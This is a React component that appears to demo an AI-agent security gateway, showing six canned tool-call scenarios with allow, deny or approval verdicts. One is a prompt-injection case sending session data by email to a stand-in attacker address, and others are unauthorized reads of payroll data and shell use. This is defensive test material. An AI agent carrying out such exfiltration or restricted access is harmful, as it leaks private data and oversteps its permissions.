import { useState } from 'react'
import StatusBadge from '../components/StatusBadge'

export default function DemoScenarios() {
  const [activeResult, setActiveResult] = useState(null)
  const [runningId, setRunningId] = useState(null)

  const scenarios = [
    {
      id: 1,
      title: 'Legitimate Task Execution',
      description: 'Agent requests to read a public whitepaper document.',
      agent: 'Research Assistant',
      action: 'document_reader.read("public_whitepaper.pdf")',
      expectedDecision: 'ALLOW',
      reason: 'Request complies with open public access policies.',
    },
    {
      id: 2,
      title: 'EchoLeak-inspired Email Prompt Injection',
      description: 'Attacker prompt attempts to exfiltrate session data via email.',
      agent: 'Research Assistant',
      action: 'email_client.send_email(to="evil@exfil.xyz")',
      expectedDecision: 'DENY',
      reason: 'Strict policy prevents untrusted agents from sending external emails.',
    },
    {
      id: 3,
      title: 'Sensitive-Data Access Attempt',
      description: 'Agent attempts unauthorized read of confidential employee payroll.',
      agent: 'Project Assistant',
      action: 'secure_fs.read("/secure/payroll_oct2026.csv")',
      expectedDecision: 'DENY',
      reason: 'Resource has RESTRICTED classification label; access denied.',
    },
    {
      id: 4,
      title: 'Tool Permission Violation',
      description: 'Low-privilege assistant attempts to invoke admin system shell.',
      agent: 'Research Assistant',
      action: 'system_shell.exec("netstat -ano")',
      expectedDecision: 'DENY',
      reason: 'Tool is strictly quarantined and blocked for this role profile.',
    },
    {
      id: 5,
      title: 'Human Approval Workflow',
      description: 'Project Manager requests external document sharing link.',
      agent: 'Project Manager',
      action: 'cloud_storage.share_external("roadmap_confidential.pdf")',
      expectedDecision: 'REQUIRE APPROVAL',
      reason: 'External link generation requires secondary administrator authorization.',
    },
    {
      id: 6,
      title: 'Fail-Closed Behaviour',
      description: 'Unknown/unregistered custom tool execution requested.',
      agent: 'Custom Agent',
      action: 'unregistered_plugin.execute()',
      expectedDecision: 'DENY',
      reason: 'Fail-closed architecture denies any unverified or missing policy definition.',
    },
  ]

  const runScenario = (scenario) => {
    setRunningId(scenario.id)
    setActiveResult(null)

    // Simulating backend inspection evaluation
    setTimeout(() => {
      setRunningId(null)
      setActiveResult({
        ...scenario,
        timestamp: new Date().toLocaleTimeString(),
      })
    }, 600)
  }

  return (
    <div className="space-y-6 text-[#E6F1FF] max-w-6xl">
      <div>
        <h2 className="text-xl font-bold tracking-tight text-white flex items-center gap-2">
          <span className="text-[#00D4FF]">🎯</span> Prepared Demonstration Scenarios
        </h2>
        <p className="text-xs text-slate-400 mt-1">
          Interactive test bench showcasing Kawach interception, enforcement, and fail-closed security[span_7](start_span)[span_7](end_span).
        </p>
      </div>

      {/* Mandatory Disclaimer Note */}
      <div className="bg-[#14213D] border border-cyan-500/30 rounded-xl p-4 text-xs font-mono text-cyan-300 flex items-center gap-3">
        <span className="text-base">ℹ</span>
        <span>
          EchoLeak-inspired simulation: not a reproduction of CVE-2025-32711[span_8](start_span)[span_8](end_span).
        </span>
      </div>

      {/* Live Result Callout */}
      {activeResult && (
        <div className="bg-[#14213D] border border-slate-700 rounded-2xl p-5 shadow-lg shadow-black/40 space-y-3">
          <div className="flex justify-between items-center">
            <span className="text-xs font-mono text-slate-400">
              Evaluated Scenario #{activeResult.id}: {activeResult.title}
            </span>
            <StatusBadge status={activeResult.expectedDecision} />
          </div>
          <div className="bg-[#0B132B] p-3 rounded-xl border border-slate-800 text-xs font-mono">
            <span className="text-slate-500 block">Proposed Action:</span>
            <span className="text-slate-200">{activeResult.action}</span>
          </div>
          <div className="text-xs text-slate-300">
            <span className="text-slate-500 font-semibold block text-[10px] uppercase">Gateway Verdict:</span>
            {activeResult.reason}
          </div>
        </div>
      )}

      {/* 6 Scenarios Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {scenarios.map((sc) => (
          <div
            key={sc.id}
            className="bg-[#14213D] border border-slate-800/80 rounded-2xl p-5 flex flex-col justify-between shadow-lg shadow-black/40 hover:border-slate-700 transition-all"
          >
            <div className="space-y-3">
              <div className="flex justify-between items-start">
                <span className="font-mono text-xs text-[#00D4FF]">Scenario 0{sc.id}</span>
                <StatusBadge status={sc.expectedDecision} />
              </div>

              <div>
                <h3 className="text-sm font-semibold text-white">{sc.title}</h3>
                <p className="text-xs text-slate-400 mt-1 leading-relaxed">
                  {sc.description}
                </p>
              </div>

              <div className="bg-[#0B132B] p-2.5 rounded-lg border border-slate-800/80 text-[11px] font-mono text-slate-300 truncate">
                {sc.action}
              </div>
            </div>

            <div className="pt-4 mt-4 border-t border-slate-800/80">
              <button
                onClick={() => runScenario(sc)}
                disabled={runningId === sc.id}
                className="w-full py-2 px-3 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-[#00D4FF] hover:text-slate-950 text-slate-200 transition-all cursor-pointer flex items-center justify-center gap-2"
              >
                {runningId === sc.id ? (
                  <>
                    <span className="w-3 h-3 border-2 border-slate-200 border-t-transparent rounded-full animate-spin"></span>
                    Running...
                  </>
                ) : (
                  'Run Scenario →'
                )}
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}